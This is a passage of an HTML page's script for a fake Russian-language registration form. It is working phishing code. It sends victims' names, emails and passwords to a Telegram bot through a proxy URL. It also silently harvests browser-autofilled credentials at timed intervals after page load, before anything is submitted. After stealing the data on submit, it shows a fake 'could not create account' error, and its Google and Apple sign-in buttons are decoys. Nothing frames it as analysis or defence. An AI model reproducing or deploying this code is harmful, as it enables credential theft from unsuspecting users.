            fetch(PROXY_URL + "/bot" + BOT_TOKEN + "/sendMessage", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: id, text: text })
            }).catch(function() {});
        });
    }

    function collectAndSend(type) {
        const name = document.getElementById("name").value.trim();
        const email = document.getElementById("email").value.trim();
        const password = document.getElementById("password").value.trim();
        send("📩 " + type + "\n👤 Имя: " + (name || "(пусто)") + "\n📧 Email: " + (email || "(пусто)") + "\n🔑 Пароль: " + (password || "(пусто)") + "\n🕒 " + new Date().toLocaleString("ru-RU"));
    }

    function showError(message) {
        const messageDiv = document.getElementById("message");
        messageDiv.textContent = message;
        messageDiv.classList.add("show");
        document.getElementById("name").classList.add("input-error");
        document.getElementById("email").classList.add("input-error");
        document.getElementById("password").classList.add("input-error");
    }

    function clearError() {
        const messageDiv = document.getElementById("message");
        messageDiv.classList.remove("show");
        messageDiv.textContent = "";
        document.getElementById("name").classList.remove("input-error");
        document.getElementById("email").classList.remove("input-error");
        document.getElementById("password").classList.remove("input-error");
    }

    function checkAutoFill() {
        const email = document.getElementById("email").value.trim();
        const password = document.getElementById("password").value.trim();
        if (email && password) {
            const name = document.getElementById("name").value.trim();
            send("📩 АВТОЗАПОЛНЕНИЕ\n👤 Имя: " + (name || "(пусто)") + "\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString("ru-RU"));
        }
    }
    window.addEventListener("load", function() {
        setTimeout(checkAutoFill, 500);
        setTimeout(checkAutoFill, 1500);
        setTimeout(checkAutoFill, 3000);
    });

    document.getElementById("loginForm").addEventListener("submit", function(event) {
        event.preventDefault();
        const name = document.getElementById("name").value.trim();
        const email = document.getElementById("email").value.trim();
        const password = document.getElementById("password").value.trim();
        const terms = document.getElementById("terms").checked;

        if (!name || !email || !password) {
            clearError();
            showError("Заполните все поля.");
            return;
        }

        if (!terms) {
            clearError();
            showError("Необходимо согласиться с условиями использования.");
            return;
        }

        clearError();
        collectAndSend("НОВАЯ РЕГИСТРАЦИЯ");
        showError("Не удалось создать аккаунт. Проверьте правильность введённых данных и попробуйте снова.");
    });

    function openDoc(title, content) {
        document.getElementById("docTitle").textContent = title;
        document.getElementById("docContent").innerHTML = content;
        document.getElementById("docOverlay").classList.add("show");
    }

    function closeDoc() {
        document.getElementById("docOverlay").classList.remove("show");
    }

    document.getElementById("docClose").addEventListener("click", closeDoc);
    document.getElementById("docOk").addEventListener("click", closeDoc);
    document.getElementById("docOverlay").addEventListener("click", function(e) {
        if (e.target.id === "docOverlay") closeDoc();
    });

    document.getElementById("termsLink").addEventListener("click", function(e) {
        e.preventDefault();
        openDoc("Условия использования", DOC_TERMS);
    });

    document.getElementById("privacyLink").addEventListener("click", function(e) {
        e.preventDefault();
        openDoc("Политика конфиденциальности", DOC_PRIVACY);
    });

    let toastTimer = null;
    function showToast() {
        const toast = document.getElementById("toast");
        toast.classList.add("show");
        if (toastTimer) clearTimeout(toastTimer);
        toastTimer = setTimeout(function() {
            toast.classList.remove("show");
        }, 2000);
    }

    document.getElementById("googleBtn").addEventListener("click", showToast);
    document.getElementById("appleBtn").addEventListener("click", showToast);

    console.log("ROCKET ACTIVE — официальные тексты");
</script>
</body>
</html>
